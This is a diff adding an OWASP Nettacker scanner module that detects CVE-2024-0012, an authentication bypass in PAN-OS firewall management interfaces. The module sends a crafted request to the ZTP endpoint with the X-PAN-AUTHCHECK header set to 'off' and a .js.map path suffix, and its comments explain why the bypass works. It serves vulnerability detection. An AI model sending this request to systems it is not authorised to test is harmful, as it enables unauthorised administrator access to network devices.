@@ -1,0 +1,100 @@
+# CVE-2024-0012 — PAN-OS Management Interface Authentication Bypass
+#
+# Root cause: On vulnerable PAN-OS versions, Nginx does not unconditionally set
+# X-pan-AuthCheck: on before proxying requests. The .js.map location block
+# lacked a proxy_default.conf include, so the X-PAN-AUTHCHECK header could be
+# supplied by the client. The PHP backend (uiEnvSetup.php) reads this header
+# and skips authentication when the value is "off".
+#
+# Detection method: Send a GET request to the ZTP (Zero Touch Provisioning)
+# endpoint using the .js.map suffix path confusion, with the X-PAN-AUTHCHECK
+# header set to "off". A vulnerable target returns HTTP 200 with the ZTP page
+# title. A patched target returns HTTP 302 redirecting to /php/login.php.
+#
+# This probe is non-destructive — the ZTP page is read-only.
+#
+# References:
+#   - https://security.paloaltonetworks.com/CVE-2024-0012  (vendor advisory)
+#   - https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/
+#   - https://nvd.nist.gov/vuln/detail/CVE-2024-0012
+#
+# Affected: PAN-OS 10.2 < 10.2.12-h2, 11.0 < 11.0.6-h1,
+#           11.1 < 11.1.5-h1, 11.2 < 11.2.4-h1
+# Products: PA-Series, VM-Series, CN-Series firewalls, Panorama
+# NOT affected: Cloud NGFW, Prisma Access
+
+info:
+  name: paloalto_panos_cve_2024_0012_vuln
+  author: OWASP Nettacker Team
+  severity: 9.3
+  description: >
+    CVE-2024-0012 is a critical authentication bypass in the Palo Alto Networks
+    PAN-OS management web interface. An unauthenticated attacker with network
+    access can gain PAN-OS administrator privileges by sending a crafted HTTP
+    request with the X-PAN-AUTHCHECK header set to off. This module detects
+    vulnerable instances by probing the Zero Touch Provisioning endpoint via
+    an Nginx path confusion technique. Affected versions are PAN-OS 10.2, 11.0,
+    11.1, and 11.2 (prior to the respective hotfixes).
+  reference:
+    - https://security.paloaltonetworks.com/CVE-2024-0012
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-0012
+    - https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/
+    - https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve
+    - paloalto
+    - paloalto_panos
+    - panos
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          # The bypass header — on vulnerable versions, Nginx does not override
+          # this value, so the PHP backend reads it and skips auth checks.
+          X-PAN-AUTHCHECK: "off"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                # The .js.map suffix exploits an Nginx location block that
+                # lacked the proxy_default.conf include on vulnerable versions,
+                # allowing the client-supplied X-PAN-AUTHCHECK header to pass
+                # through to the PHP backend without being overridden to "on".
+                - "php/ztp_gate.php/.js.map"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 4443
+                - 8443
+        response:
+          condition_type: and
+          conditions:
+            # Condition 1: Vulnerable target returns HTTP 200.
+            # Patched target returns HTTP 302 (redirect to /php/login.php).
+            status_code:
+              regex: "200"
+              reverse: false
+            # Condition 2: The response body must contain the PAN-OS ZTP page
+            # title. This is a strong product-specific fingerprint that
+            # eliminates false positives from generic web servers.
+            content:
+              regex: "(?i)<title>\\s*Zero Touch Provisioning\\s*</title>"
+              reverse: false
